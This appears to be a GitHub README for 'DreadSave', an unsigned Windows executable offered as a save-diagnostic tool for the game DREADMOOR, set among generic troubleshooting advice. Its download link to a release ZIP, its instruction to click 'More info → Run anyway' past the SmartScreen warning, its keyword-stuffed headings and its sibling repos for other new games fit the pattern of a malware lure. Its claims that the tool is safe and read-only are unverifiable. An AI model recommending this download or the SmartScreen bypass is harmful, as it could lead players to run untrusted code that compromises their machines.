# DREADMOOR Cannot Save Game — Missing Progress and Load Problems on PC

<p align="center">
  <img src="https://i.postimg.cc/XvBrxTpX/banner.png" alt="DREADMOOR — Save Check for Windows PC" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Save%20%26%20Load%20Audit-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-dread--save--r12-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

**Windows PC · DREADMOOR · Save and troubleshooting documentation**

Players reported that **DREADMOOR could not save** or that the newest progress was not available after reloading. In a Steam discussion on 16 November 2026, a developer acknowledged problems affecting saving and loading. A subsequent reply said the November 16 update included a save-related fix and asked players to confirm whether it helped.

That makes the first step simple: **update the game**. This repository is aimed at players who still see save or load problems after doing so, and at anyone who wants to preserve the saves they already have before trying recovery steps.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| Save Game button greyed out or fails to write | Pre-Nov 16 build bug or scripted sequence / folder write lock | Update to Nov 16+ Steam build and inspect save folder permissions |
| Progress rolls back several hours on relaunch | Newer save failed to flush or Steam Cloud synced an older snapshot | Exit immediately and back up `%USERPROFILE%\AppData\LocalLow` before playing |
| Load menu hides an existing save file | Mismatched slot metadata or corrupted slot header | Copy the entire save directory before testing slot recovery |
| Unsure where DREADMOOR stores local saves | Saves live in user AppData profile rather than the Steam install folder | Scan `AppData\LocalLow`, `AppData\Local`, and `Steam\userdata` |

## Download for Windows

[**Download DreadSave.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/DreadSave.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `DreadSave.exe`? (Automatic checks in ~2 seconds)

- Automatically locates DREADMOOR save folders across `AppData\LocalLow`, `AppData\Local`, and Steam `userdata` (`3629430`).
- Lists every save file with exact sizes and modified timestamps to pinpoint where progress stopped writing.
- Flags `0 KB` or locked files without altering permissions or disabling Windows Defender.
- Prepares a clean summary so you can back up surviving saves before testing recovery.

### Sample Diagnostic Output

```text
[DreadSave] Searching Windows profile & Steam userdata for DREADMOOR (3629430)...
[OK]   Local Save Dir   : C:\Users\Player\AppData\LocalLow\DREADMOOR\Saves
[OK]   Slot_01.sav      : 418.5 KB | Modified: 2026-11-18 19:42:10
[WARN] Slot_02.sav      : 0.0 KB   | Modified: 2026-11-18 22:15:03 [EMPTY FILE]
[OK]   Steam Cloud Dir  : D:\Steam\userdata\41299104\3629430\remote (2 files)
```

The link downloads the ZIP file attached to the latest GitHub Release, rather than opening the Releases page.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `DreadSave.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Install and run

1. Download **DreadSave.zip** using the link above.
2. Right-click the downloaded archive and choose **Extract All**.
3. Open the extracted folder and start **DreadSave.exe**.
4. Review the program’s options before applying changes to game files, saves, or Windows settings.
5. Launch the game again and check whether the original problem remains.

Close the game before working with its save files. If Windows displays a security warning, check the file and its publisher instead of disabling protection.

## When this guide applies

- The Save Game option is disabled or greyed out.
- The game returns to an earlier checkpoint after you reopen it.
- The Load menu shows an older save despite recent manual saves.
- Saving works intermittently rather than failing on every attempt.

## Before changing anything

Make sure you are running the most recent available Steam build, then exit the game properly. Identify existing save files and make a copy before testing permissions or renaming any data. Keep a note of the in-game location and the time you last saved; this makes it easier to compare with file modification dates.

Do not take ownership of entire Windows folders or turn off real-time protection as a first step. A game bug and a blocked file write can look similar but require different solutions.

## What to check

Check whether the save option is available at the current point in the game; some scripted states may temporarily prevent manual saving. If it remains unavailable during ordinary gameplay, record what changed immediately before the failure.

If files are present, preserve them before investigating access permissions. Windows File Explorer can show a read-only checkbox on folders, but changing it blindly does not prove why the game failed. If the game does not create new save data at all, collect a short reproduction description and use the official bug-report route. A local utility cannot fix a game-side condition that prevents the save routine from running.

## What this project covers

This is a **DREADMOOR save not working** and **DREADMOOR lost progress** troubleshooting project, not a save editor. It should never fabricate progression, unlock achievements or overwrite files without an explicit backup and user choice.

## Troubleshooting

### Save button is still greyed out after patching

Test after completing any introductory scripted sequence and document the exact state; the game may still be limiting saves.

### Progress rolls back several hours

Stop making new saves for the moment, preserve any available copies and check whether a later file can be found.

### Load menu cannot see a file

Back it up first; changing filenames or deleting others without knowing the format can make recovery harder.

## Frequently asked questions

**Did the November update fix all save issues?**

The developer reported a save fix in the 16 November update, but individual cases can differ.

**Can the utility recover progress that was never written to disk?**

No. It can only work with data that exists in a usable form.

**Is this an official DREADMOOR patch?**

No. Only game developers can issue official fixes to the game executable.

## Sources and game updates

These links are useful for checking whether a symptom is still present on the latest patch.
- [Steam discussion: Can’t save](https://steamcommunity.com/app/3629430/discussions/0/571554831822654154/)
- [Steam discussion: Loaded save issue](https://steamcommunity.com/app/3629430/discussions/0/571554831822590489/)
- [DREADMOOR Steam announcements](https://steamcommunity.com/app/3629430/allnews/)

## More Windows Game Diagnostic Tools

- [Permafrost-SaveGuard](../Permafrost-SaveGuard) — Permafrost `BackupSaves` & missing world diagnostics
- [MoonSweepers-SaveVault](../MoonSweepers-SaveVault) — Moon Sweepers `MoonSessions` snapshot & backup manager
- [OverTheHill-SaveLocator](../OverTheHill-SaveLocator) — over the hill Nov 17 save-location migration check
- [ProbablyStolen-SaveRepair](../ProbablyStolen-SaveRepair) — Probably Stolen `.es3` save slot recovery & backup check

## Disclaimer

This is an independent community project for DREADMOOR players and is not an official release from the game developer or publisher. A missing save, server outage or internal game bug may not be repairable by third-party software.
 
 
 
 
 
 
 
